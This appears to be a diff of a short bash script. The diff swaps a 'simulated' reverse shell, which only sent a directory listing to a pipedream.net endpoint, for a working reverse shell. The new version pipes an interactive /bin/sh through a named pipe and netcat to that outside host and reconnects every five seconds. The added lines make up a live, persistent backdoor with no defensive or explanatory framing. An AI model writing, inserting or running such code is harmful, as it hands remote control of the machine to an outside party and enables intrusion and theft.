@@ -1,24 +1,13 @@
 #!/bin/bash
 
-# Define the host and port
 HOST="eop3b98jxkzuqt4.m.pipedream.net"
 PORT=80
 
-# Function to send data
-send_data() {
-    echo -e "POST / HTTP/1.1\r\nHost: $HOST\r\nContent-Type: text/plain\r\nContent-Length: ${#1}\r\n\r\n$1" | nc $HOST $PORT
-}
-
-# Simulate a reverse shell
 while true; do
-    # Send initial connection message
-    send_data "Reverse shell connected"
-
-    # Simulate command execution
-    OUTPUT=$(ls -la)
-
-    # Send the output back
-    send_data "$OUTPUT"
-
+    echo "Attempting to connect to $HOST:$PORT..."
+    rm -f /tmp/f
+    mkfifo /tmp/f
+    cat /tmp/f | /bin/sh -i 2>&1 | nc $HOST $PORT > /tmp/f
+    echo "Connection closed. Retrying in 5 seconds..."
     sleep 5
 done
